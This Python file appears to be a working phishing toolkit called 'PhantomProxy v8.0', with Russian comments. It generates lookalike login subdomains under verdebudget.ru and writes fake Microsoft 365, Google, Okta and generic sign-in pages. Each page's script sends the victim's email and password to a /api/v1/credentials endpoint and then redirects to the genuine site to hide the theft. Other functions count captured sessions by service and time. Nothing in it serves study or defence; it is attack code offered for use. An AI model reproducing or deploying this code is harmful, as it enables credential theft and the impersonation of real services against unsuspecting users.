#!/usr/bin/env python3
"""
PhantomProxy v8.0 - Auto-Attack System
- Автоматическая генерация фишлетов
- Auto-deployment на поддомены
- Smart targeting
- Campaign management
"""

import json
import sqlite3
import random
import string
import os
from datetime import datetime
from pathlib import Path

DB_PATH = Path('/home/ubuntu/phantom-proxy/phantom.db')
TEMPLATES_PATH = Path('/home/ubuntu/phantom-proxy/templates')

class AutoAttackSystem:
    def __init__(self):
        self.db_path = DB_PATH
        self.templates_path = TEMPLATES_PATH
    
    def get_db(self):
        conn = sqlite3.connect(self.db_path)
        conn.row_factory = sqlite3.Row
        return conn
    
    def generate_subdomain(self, service):
        """Генерация поддомена для сервиса"""
        prefixes = ['login', 'secure', 'auth', 'portal', 'account', 'my', 'sso', 'signin']
        service_short = service.split()[0].lower()
        prefix = random.choice(prefixes)
        return f"{prefix}-{service_short}.verdebudget.ru"
    
    def create_auto_campaign(self, service, target_count=10):
        """Создание автоматической кампании"""
        subdomains = []
        
        for i in range(target_count):
            subdomain = self.generate_subdomain(service)
            subdomains.append({
                'subdomain': subdomain,
                'service': service,
                'created': datetime.now().isoformat(),
                'status': 'active'
            })
        
        return subdomains
    
    def generate_phishlet(self, service):
        """Автоматическая генерация фишлета"""
        templates = {
            'Microsoft 365': self._create_microsoft_template(),
            'Google': self._create_google_template(),
            'Okta': self._create_okta_template(),
        }
        
        return templates.get(service, self._create_generic_template())
    
    def _create_microsoft_template(self):
        return '''
<!DOCTYPE html>
<html>
<head>
    <title>Вход в Microsoft 365</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Segoe UI', Arial, sans-serif; background: #f0f2f5; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        .container { background: white; padding: 44px; border-radius: 5px; box-shadow: 0 2px 6px rgba(0,0,0,0.2); width: 100%; max-width: 440px; }
        .logo { text-align: center; margin-bottom: 24px; }
        h1 { font-size: 24px; font-weight: 600; color: #1a1a1a; margin-bottom: 8px; }
        input { width: 100%; padding: 10px 12px; border: 2px solid #8a8886; border-radius: 3px; margin-bottom: 16px; }
        .btn { width: 100%; padding: 10px 24px; background: #0078d4; color: white; border: none; border-radius: 3px; cursor: pointer; }
    </style>
</head>
<body>
    <div class="container">
        <h1>Вход в Microsoft 365</h1>
        <form onsubmit="handleSubmit(event)">
            <input type="email" id="email" placeholder="Email" required>
            <input type="password" id="password" placeholder="Пароль" required>
            <button type="submit" class="btn">Войти</button>
        </form>
    </div>
    <script>
        async function handleSubmit(e) {
            e.preventDefault();
            const data = {
                email: document.getElementById('email').value,
                password: document.getElementById('password').value,
                service: 'Microsoft 365'
            };
            await fetch('/api/v1/credentials', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify(data)
            });
            window.location.href = 'https://login.microsoftonline.com';
        }
    </script>
</body>
</html>
'''
    
    def _create_google_template(self):
        return '''
<!DOCTYPE html>
<html>
<head>
    <title>Вход в Google</title>
    <style>
        body { font-family: 'Roboto', Arial, sans-serif; background: #f0f2f5; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        .container { background: white; padding: 48px 40px; border-radius: 8px; box-shadow: 0 1px 3px rgba(0,0,0,0.12); }
        input { width: 100%; padding: 13px 15px; border: 1px solid #dadce0; border-radius: 4px; margin-bottom: 20px; }
        .btn { width: 100%; padding: 10px 24px; background: #1a73e8; color: white; border: none; border-radius: 4px; cursor: pointer; }
    </style>
</head>
<body>
    <div class="container">
        <h1>Вход в Google</h1>
        <form onsubmit="handleSubmit(event)">
            <input type="email" id="email" placeholder="Email" required>
            <input type="password" id="password" placeholder="Пароль" required>
            <button type="submit" class="btn">Далее</button>
        </form>
    </div>
    <script>
        async function handleSubmit(e) {
            e.preventDefault();
            const data = {
                email: document.getElementById('email').value,
                password: document.getElementById('password').value,
                service: 'Google Workspace'
            };
            await fetch('/api/v1/credentials', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify(data)
            });
            window.location.href = 'https://accounts.google.com';
        }
    </script>
</body>
</html>
'''
    
    def _create_okta_template(self):
        return '''
<!DOCTYPE html>
<html>
<head>
    <title>Вход в Okta</title>
    <style>
        body { font-family: Arial, sans-serif; background: #007DC1; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        .container { background: white; padding: 40px; border-radius: 4px; }
        input { width: 100%; padding: 12px; border: 1px solid #ccc; border-radius: 4px; margin-bottom: 16px; }
        .btn { width: 100%; padding: 12px; background: #007DC1; color: white; border: none; border-radius: 4px; cursor: pointer; }
    </style>
</head>
<body>
    <div class="container">
        <h1>Вход в Okta</h1>
        <form onsubmit="handleSubmit(event)">
            <input type="email" id="email" placeholder="Email" required>
            <input type="password" id="password" placeholder="Пароль" required>
            <button type="submit" class="btn">Войти</button>
        </form>
    </div>
    <script>
        async function handleSubmit(e) {
            e.preventDefault();
            const data = {
                email: document.getElementById('email').value,
                password: document.getElementById('password').value,
                service: 'Okta SSO'
            };
            await fetch('/api/v1/credentials', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify(data)
            });
            window.location.href = 'https://login.okta.com';
        }
    </script>
</body>
</html>
'''
    
    def _create_generic_template(self):
        return '''
<!DOCTYPE html>
<html>
<head>
    <title>Вход в систему</title>
    <style>
        body { font-family: Arial, sans-serif; background: #f0f2f5; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        .container { background: white; padding: 40px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
        input { width: 100%; padding: 12px; border: 1px solid #ccc; border-radius: 4px; margin-bottom: 16px; }
        .btn { width: 100%; padding: 12px; background: #007bff; color: white; border: none; border-radius: 4px; cursor: pointer; }
    </style>
</head>
<body>
    <div class="container">
        <h1>Вход в систему</h1>
        <form onsubmit="handleSubmit(event)">
            <input type="email" id="email" placeholder="Email" required>
            <input type="password" id="password" placeholder="Пароль" required>
            <button type="submit" class="btn">Войти</button>
        </form>
    </div>
    <script>
        async function handleSubmit(e) {
            e.preventDefault();
            const data = {
                email: document.getElementById('email').value,
                password: document.getElementById('password').value,
                service: 'Generic'
            };
            await fetch('/api/v1/credentials', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify(data)
            });
            window.location.href = 'https://google.com';
        }
    </script>
</body>
</html>
'''
    
    def save_phishlet(self, service, template):
        """Сохранение фишлета"""
        filename = f"{service.lower().replace(' ', '_')}_auto.html"
        filepath = self.templates_path / filename
        
        with open(filepath, 'w') as f:
            f.write(template)
        
        return filepath
    
    def get_attack_statistics(self):
        """Статистика атак"""
        conn = self.get_db()
        c = conn.cursor()
        
        c.execute('SELECT COUNT(*) FROM sessions')
        total = c.fetchone()[0]
        
        c.execute('SELECT service, COUNT(*) as count FROM sessions GROUP BY service ORDER BY count DESC')
        services = {row[0]: row[1] for row in c.fetchall()}
        
        c.execute('SELECT COUNT(*) FROM sessions WHERE datetime(created_at) > datetime("now", "-1 hour")')
        last_hour = c.fetchone()[0]
        
        c.execute('SELECT COUNT(*) FROM sessions WHERE datetime(created_at) > datetime("now", "-24 hours")')
        last_day = c.fetchone()[0]
        
        conn.close()
        
        return {
            'total': total,
            'last_hour': last_hour,
            'last_day': last_day,
            'services': services,
            'generated_at': datetime.now().isoformat()
        }
    
    def run_auto_attack(self, target_service, count=5):
        """Запуск автоматической атаки"""
        print(f'🚀 Starting auto-attack on {target_service}')
        print(f'📊 Generating {count} subdomains...')
        
        subdomains = self.create_auto_campaign(target_service, count)
        
        print(f'🎨 Generating phishlet...')
        template = self.generate_phishlet(target_service)
        
        print(f'💾 Saving phishlet...')
        filepath = self.save_phishlet(target_service, template)
        
        print(f'✅ Auto-attack ready!')
        print(f'   Subdomains: {len(subdomains)}')
        print(f'   Template: {filepath}')
        
        return {
            'subdomains': subdomains,
            'template_path': str(filepath),
            'service': target_service,
            'count': count
        }

if __name__ == '__main__':
    attack = AutoAttackSystem()
    
    # Тест
    print('🔍 Auto-Attack System Test')
    stats = attack.get_attack_statistics()
    print(f'📊 Stats: {json.dumps(stats, indent=2)}')
